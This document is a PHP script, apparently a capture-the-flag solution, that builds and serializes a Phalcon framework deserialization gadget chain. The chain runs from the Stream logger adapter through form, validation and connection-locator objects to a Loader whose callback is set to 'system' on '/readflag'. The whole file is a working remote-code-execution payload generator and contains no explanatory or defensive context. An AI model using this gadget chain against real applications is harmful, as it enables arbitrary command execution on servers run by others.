<?php
    namespace Phalcon\DataMapper\Pdo {
        class ConnectionLocator {
            public $write;
            public function __construct(){
                $rce = [new \Phalcon\Loader(), "loadFiles"];
                $this->write = ["key" => $rce];
            }
        }
    }

    namespace Phalcon {
        class Validation {
            public $entity;
            public function __construct() {
                $this->entity = new \Phalcon\DataMapper\Pdo\ConnectionLocator();
            }
        }

        class Loader {
            public $fileCheckingCallback = "system";
            public $files=["/readflag"];
        }
    }

    namespace Phalcon\Forms\Element {
        class Date {
            public $name = "write";
            public $form;
            public function __construct(){
                $this->form = new \Phalcon\Validation();
            }
        }
    }

    namespace Phalcon\Logger {
        class Item {
            public $message = "";
            public function __construct() {
                $this->message = new \Phalcon\Forms\Element\Date();
            }
        }
    }

    namespace Phalcon\Logger\Formatter{
        class Line {
            public $format='%message%';
        }
    }

    namespace Phalcon\Logger\Adapter {
        class Stream {
            public $inTransaction = true;
            public $name = "/tmp/abc";
            public $queue;
            public $formatter;
            public function __construct() {
                $this->formatter = new \Phalcon\Logger\Formatter\Line();
                $this->queue = ["1" => new \Phalcon\Logger\Item()];
            }
        }
    }

    namespace {
        echo serialize(new \Phalcon\Logger\Adapter\Stream());
    }
?>